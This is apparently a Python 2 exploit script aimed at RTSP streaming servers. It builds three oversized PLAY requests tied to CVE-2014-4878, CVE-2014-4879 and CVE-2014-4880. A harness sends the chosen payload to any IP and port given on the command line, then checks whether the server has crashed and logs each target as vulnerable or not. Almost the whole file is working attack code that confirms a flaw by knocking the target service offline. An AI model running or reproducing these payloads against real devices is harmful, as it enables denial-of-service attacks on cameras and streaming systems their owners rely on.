#!/usr/bin/env python
# coding: utf-8

'''
Created on 2015年3月23日

@author: yanwf
'''

import sys
import socket
import time 

def do_log(Host, Port, username, password, state, log_file, poc):

    bugname = { '1':'CVE-2014-4878',
                '2':'CVE-2014-4879',
                '3':'CVE-2014-4880',
              }
    
    if state == "successed":
        log_file.write(time.strftime('%Y%m%d%H%M%S')+ ":")
        log_file.write("vulnerable")
        log_file.write(" ip:" + Host)
        log_file.write(" port:" + Port)
        log_file.write(" rtsp:" + bugname[poc] + "\n")
    elif state == "failed":
        log_file.write(time.strftime('%Y%m%d%H%M%S') + ":")
        log_file.write("unvulnerable")
        log_file.write(" ip:" + Host)
        log_file.write(" port:" + Port + "\n")
        #log_file.write(" rtsp:" + state)
        #log_file.write(" rtsp:" + bugname[poc])
    else:
        log_file.write(time.strftime('%Y%m%d%H%M%S') + ":")
        log_file.write("network can not connected")
        log_file.write(" ip:" + Host)
        log_file.write(" port:" + Port)
        log_file.write(" rtsp:" + bugname[poc] + "\n")
        #log_file.write(" rtsp:" + bugname[poc])


def cve20144878_poc(host):

#payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
    payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
    payload += 'CSeq: 7\r\n'
    payload += 'Authorization: Basic AAAAAAA\r\n'
    payload += 'Content-length: 3200\r\n\r\n'
    payload += 'A' * 3200

    return payload

def cve20144879_poc(host):
    payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
    payload += 'Authorization'
    payload += 'A' * 1024
    payload += ': Basic AAAAAAA\r\n\r\n'
    return payload

def cve20144880_poc(host):
    payload = 'PLAY rtsp://%s/ RTSP/1.0\r\n' % host
    payload += 'CSeq: 7\r\n'
    payload += 'Authorization: Basic '
    payload += 'A' * 2048
    payload += '\r\n\r\n'
    payload += 'B' * 1024

    return payload

def check_port_on(host, port):
    socket.setdefaulttimeout(2)
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    check_target = (host, int(port))

    port_status = soc.connect_ex(check_target)
    if port_status == 0:
        return True
    else:
        return False

def check_vuln_exists(host, port, poc):
    socket.setdefaulttimeout(2)
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.connect((host, int(port)))
    except socket.error:
        return False

    if poc == '1':
        payload = cve20144878_poc(host)
    elif poc == '2':
        payload = cve20144879_poc(host)
    else:
        payload = cve20144880_poc(host)

    soc.send(payload)
    soc.close()

    time.sleep(1)  # sleep to wait server crash
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.connect((host, 554))
    except socket.error:
        return True

    return False

def rtsp():
    if sys.argv.__len__() < 5:
        print '\nUsage: %s <IP> <PORT> <POCn> <LOGNAME>' % sys.argv[0]
        sys.exit()
        
    ip = sys.argv[1]
    port= sys.argv[2]
    poc_number = sys.argv[3]
    log_file_name = sys.argv[4]

    if poc_number not in '123':
        print 'Choose one POC.'
        sys.exit()

    #log_file_name = "rtsp" + time.strftime('%Y%m%d%H%M%S') + '.log'
    log_file = open(log_file_name, "a")

    if check_port_on(ip, port):
        vuln_exists = check_vuln_exists(ip, port, poc_number)
        if vuln_exists:
            print 'Target %s is vulnerable.' %ip
            do_log(ip, port, "", "", "successed", log_file, poc_number)
        else:
            print 'Target %s may not be vulnerable.' %ip
            do_log(ip, port, "", "", "failed", log_file, poc_number)
    else:
        print 'RTSP(ip %s port %s poc_number %s) closed' %(ip, port, poc_number)
        do_log(ip, port, "", "", "", log_file, poc_number)

    log_file.close() 

if __name__ == '__main__':
    rtsp()
   
